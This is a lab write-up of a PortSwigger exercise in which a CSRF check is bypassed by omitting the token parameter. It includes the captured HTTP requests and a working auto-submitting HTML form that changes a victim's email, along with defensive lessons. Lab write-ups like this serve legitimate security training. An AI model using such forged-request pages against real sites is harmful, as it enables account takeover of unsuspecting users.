# CSRF where token validation depends on token being present

## Lab Description

This lab demonstrates a Cross-Site Request Forgery (CSRF) vulnerability where the application uses a CSRF token for protection, but the server only validates the token when the token parameter is present.

By removing the CSRF token parameter completely from the request, the validation can be bypassed.

The vulnerable functionality allows an authenticated user to change their email address.

## Vulnerability

The vulnerable endpoint is:

```text
/my-account/change-email
```

A normal email-change request contains a CSRF token:

```http
POST /my-account/change-email HTTP/2
Host: <LAB-ID>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

email=test@example.com&csrf=<CSRF_TOKEN>
```

The application validates the CSRF token when the `csrf` parameter is included.

However, if the entire `csrf` parameter is removed, the application does not perform the validation and still processes the request.

## Steps to Reproduce

### 1. Log in to the Lab

Log in to the PortSwigger Web Security Academy lab using the provided credentials.

Navigate to:

```text
/my-account
```

The account page contains the functionality to change the email address.

### 2. Capture the Email Change Request

Use Burp Suite to intercept the request generated when changing the email address.

The request contains:

```http
POST /my-account/change-email HTTP/2
Host: <LAB-ID>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

email=test@example.com&csrf=<CSRF_TOKEN>
```

The important parameter is:

```text
csrf=<CSRF_TOKEN>
```

### 3. Test the CSRF Token

Send the request to Burp Repeater and modify the CSRF token.

For example:

```http
POST /my-account/change-email HTTP/2
Host: <LAB-ID>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

email=test@example.com&csrf=invalid
```

The application rejects the request because the supplied token is invalid.

This indicates that the application performs CSRF validation when the `csrf` parameter is present.

### 4. Remove the CSRF Parameter

Remove the entire `csrf` parameter instead of replacing it with an invalid value.

The request becomes:

```http
POST /my-account/change-email HTTP/2
Host: <LAB-ID>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

email=test@example.com
```

The application accepts the request.

This confirms that CSRF validation is only performed when the token parameter is present.

## Exploit

Create a malicious HTML page that submits the email-change request without including a CSRF token.

```html
<html>
<body>

<form action="https://<LAB-ID>.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@gmail.com">
</form>

<script>
    document.forms[0].submit();
</script>

</body>
</html>
```

Notice that the form contains no:

```html
<input type="hidden" name="csrf" value="...">
```

This is intentional because the application does not require the CSRF token when the parameter is absent.

## Delivering the Exploit

Place the HTML payload on the PortSwigger Exploit Server.

Store the exploit and select:

**Deliver exploit to victim**

When the victim visits the exploit page, the form is automatically submitted.

The victim's browser sends the request using the victim's authenticated session.

The request contains:

```http
POST /my-account/change-email HTTP/2

email=attacker@gmail.com
```

Because the `csrf` parameter is completely absent, the vulnerable application does not perform CSRF token validation.

## Why the Attack Works

The application's CSRF validation logic effectively behaves like:

```text
CSRF parameter present?
        |
       Yes
        |
        v
Validate CSRF token
        |
        v
Valid token → Process request
Invalid token → Reject request

CSRF parameter absent
        |
        v
No validation
        |
        v
Process request
```

The security check should instead reject the request whenever a valid CSRF token is not supplied.

The attacker takes advantage of the difference between:

```text
csrf=invalid
```

and:

```text
csrf parameter completely absent
```

The first is rejected, while the second is accepted.

## Result

The victim's email address is changed to the attacker-controlled email address.

This confirms that the CSRF protection can be bypassed by omitting the CSRF token parameter entirely.

## Key Learning

- CSRF tokens must be mandatory for protected state-changing requests.
- Removing a security parameter should never cause validation to be skipped.
- Applications should reject requests when the CSRF token is missing.
- Invalid and missing CSRF tokens should both result in request rejection.
- Server-side validation must explicitly check that a CSRF token exists before validating its value.
- Burp Suite Repeater is useful for testing differences between missing, invalid, and valid security parameters.

## Conclusion

The lab was solved by identifying that the application only validates the CSRF token when the `csrf` parameter is present.

An invalid CSRF token is rejected, but completely removing the token causes the application to skip validation and accept the state-changing request.

A malicious HTML form can therefore omit the CSRF token and force an authenticated victim to change their email address.

The vulnerability can be prevented by making the CSRF token mandatory and rejecting every state-changing request where the token is missing or invalid.
